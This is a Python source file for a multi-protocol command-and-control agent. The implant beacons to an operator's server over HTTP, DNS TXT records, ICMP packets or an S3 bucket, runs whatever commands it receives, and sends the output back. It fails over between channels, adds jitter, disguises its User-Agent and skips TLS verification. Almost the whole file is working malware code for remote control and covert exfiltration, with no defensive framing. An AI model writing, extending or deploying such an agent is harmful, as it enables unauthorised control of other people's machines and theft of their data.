"""
Multi-Protocol C2 Agent Core
Protocol handlers and failover logic
"""

import time
import json
import base64
import random
import secrets
import socket
import platform
from .utils import execute_command


class MultiProtocolAgent:
    """
    Multi-protocol C2 agent with automatic failover
    Supports HTTP, DNS, ICMP, and Cloud (S3) protocols
    """
    
    def __init__(self, config):
        self.config = config
        self.session_id = secrets.token_hex(8)
        self.current_protocol = None
        self.failed_protocols = set()
        
        # Protocol handlers
        self.protocols = {
            'http': self.http_protocol,
            'dns': self.dns_protocol,
            'icmp': self.icmp_protocol,
            'cloud': self.cloud_protocol
        }
        
        # Try protocols in order of preference
        self.protocol_order = config.get('protocol_order', ['http', 'dns', 'cloud', 'icmp'])
        
        print(f"[*] Multi-Protocol Agent initialized")
        print(f"[*] Session ID: {self.session_id}")
        print(f"[*] Available protocols: {', '.join(self.protocols.keys())}")
    
    def try_protocol(self, protocol_name):
        """Try to use a specific protocol"""
        if protocol_name in self.failed_protocols:
            return None
        
        try:
            handler = self.protocols.get(protocol_name)
            if handler:
                result = handler('beacon', None)
                if result is not None:
                    self.current_protocol = protocol_name
                    print(f"[+] Using protocol: {protocol_name}")
                    return result
                else:
                    print(f"[-] Protocol failed: {protocol_name}")
                    self.failed_protocols.add(protocol_name)
        
        except Exception as e:
            print(f"[-] Protocol error ({protocol_name}): {e}")
            self.failed_protocols.add(protocol_name)
        
        return None
    
    def find_working_protocol(self):
        """Find a working C2 protocol"""
        for protocol in self.protocol_order:
            if protocol not in self.failed_protocols:
                result = self.try_protocol(protocol)
                if result is not None:
                    return True
        
        # All protocols failed - reset and try again
        print("[!] All protocols failed - resetting")
        self.failed_protocols.clear()
        time.sleep(60)
        return False
    
    def http_protocol(self, action, data=None):
        """HTTP/HTTPS protocol handler"""
        try:
            import requests
            
            server_url = self.config.get('http_server')
            auth_token = self.config.get('http_token')
            
            if not server_url:
                return None
            
            headers = {
                'Authorization': f'Bearer {auth_token}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            if action == 'beacon':
                # Send beacon
                payload = {
                    'session_id': self.session_id,
                    'hostname': socket.gethostname(),
                    'os': platform.system()
                }
                
                response = requests.post(
                    f'{server_url}/api/v1/sync',
                    json={'data': base64.b64encode(json.dumps(payload).encode()).decode()},
                    headers=headers,
                    verify=False,
                    timeout=30
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('status') == 'success':
                        # Decode response
                        encoded_data = data.get('data')
                        decoded = json.loads(base64.b64decode(encoded_data))
                        return decoded.get('tasks', [])
            
            elif action == 'result':
                # Submit result
                response = requests.post(
                    f'{server_url}/api/v1/results',
                    json={'data': base64.b64encode(json.dumps(data).encode()).decode()},
                    headers=headers,
                    verify=False,
                    timeout=30
                )
                
                return response.status_code == 200
        
        except Exception as e:
            return None
        
        return None
    
    def dns_protocol(self, action, data=None):
        """DNS protocol handler"""
        try:
            import dns.resolver
            
            c2_domain = self.config.get('dns_domain')
            if not c2_domain:
                return None
            
            resolver = dns.resolver.Resolver()
            dns_server = self.config.get('dns_server')
            if dns_server:
                resolver.nameservers = [dns_server]
            
            if action == 'beacon':
                # Query for tasks
                query_name = f"beacon-{self.session_id}.{c2_domain}"
                
                try:
                    answers = resolver.resolve(query_name, 'TXT')
                    
                    for rdata in answers:
                        txt_data = rdata.to_text().strip('"')
                        if txt_data:
                            command = base64.b64decode(txt_data).decode()
                            return [{'task_id': secrets.token_hex(8), 'command': command}]
                except:
                    pass
                
                return []
            
            elif action == 'result':
                # Send result via DNS query
                encoded = base64.b64encode(json.dumps(data).encode()).decode()[:50]
                query_name = f"data-{self.session_id}-0-{encoded}.{c2_domain}"
                
                try:
                    resolver.resolve(query_name, 'A')
                except:
                    pass
                
                return True
        
        except Exception as e:
            return None
        
        return None
    
    def icmp_protocol(self, action, data=None):
        """ICMP protocol handler"""
        try:
            from scapy.all import IP, ICMP, Raw, sr1
            
            c2_server = self.config.get('icmp_server')
            if not c2_server:
                return None
            
            if action == 'beacon':
                # Send ICMP beacon
                message = {
                    'type': 'beacon',
                    'session_id': self.session_id
                }
                
                encoded = base64.b64encode(json.dumps(message).encode()).decode()
                payload = f"C2:{encoded}"
                
                packet = IP(dst=c2_server)/ICMP()/Raw(load=payload)
                reply = sr1(packet, timeout=5, verbose=False)
                
                if reply and reply.haslayer(Raw):
                    reply_data = reply[Raw].load.decode()
                    if reply_data.startswith('C2:'):
                        message = json.loads(base64.b64decode(reply_data[3:]))
                        
                        if message.get('type') == 'command':
                            return [message]
                
                return []
            
            elif action == 'result':
                # Send result
                message = {
                    'type': 'result',
                    'session_id': self.session_id,
                    'task_id': data.get('task_id'),
                    'output': data.get('output')
                }
                
                encoded = base64.b64encode(json.dumps(message).encode()).decode()
                payload = f"C2:{encoded}"
                
                packet = IP(dst=c2_server)/ICMP()/Raw(load=payload)
                sr1(packet, timeout=5, verbose=False)
                
                return True
        
        except Exception as e:
            return None
        
        return None
    
    def cloud_protocol(self, action, data=None):
        """Cloud (S3) protocol handler"""
        try:
            import boto3
            
            bucket = self.config.get('cloud_bucket')
            access_key = self.config.get('cloud_access_key')
            secret_key = self.config.get('cloud_secret_key')
            region = self.config.get('cloud_region', 'us-east-1')
            
            if not all([bucket, access_key, secret_key]):
                return None
            
            s3 = boto3.client(
                's3',
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                region_name=region
            )
            
            if action == 'beacon':
                # Check for task
                task_key = f"tasks/{self.session_id}.json"
                
                try:
                    response = s3.get_object(Bucket=bucket, Key=task_key)
                    task_data = response['Body'].read().decode()
                    
                    # Delete task
                    s3.delete_object(Bucket=bucket, Key=task_key)
                    
                    task = json.loads(task_data)
                    return [task]
                except:
                    pass
                
                return []
            
            elif action == 'result':
                # Upload result
                result_key = f"results/{self.session_id}-{data['task_id']}.json"
                
                s3.put_object(
                    Bucket=bucket,
                    Key=result_key,
                    Body=json.dumps(data).encode()
                )
                
                return True
        
        except Exception as e:
            return None
        
        return None
    
    def run(self):
        """Main beacon loop with automatic failover"""
        print(f"[*] Starting multi-protocol agent")
        
        while True:
            try:
                # Find working protocol if needed
                if not self.current_protocol:
                    if not self.find_working_protocol():
                        continue
                
                # Try current protocol
                tasks = None
                try:
                    handler = self.protocols[self.current_protocol]
                    tasks = handler('beacon', None)
                except Exception as e:
                    print(f"[-] Protocol failed: {self.current_protocol}")
                    self.failed_protocols.add(self.current_protocol)
                    self.current_protocol = None
                    continue
                
                # Process tasks
                if tasks:
                    for task in tasks:
                        task_id = task.get('task_id')
                        command = task.get('command')
                        
                        print(f"[*] Executing: {command[:50]}...")
                        
                        # Execute
                        output = execute_command(command)
                        
                        # Submit result
                        result_data = {
                            'session_id': self.session_id,
                            'task_id': task_id,
                            'output': output
                        }
                        
                        try:
                            handler('result', result_data)
                            print(f"[+] Result submitted")
                        except:
                            print(f"[-] Failed to submit result")
                
                # Sleep with jitter
                time.sleep(60 + random.randint(-30, 30))
            
            except KeyboardInterrupt:
                print("\n[!] Agent stopped")
                break
            except Exception as e:
                time.sleep(60)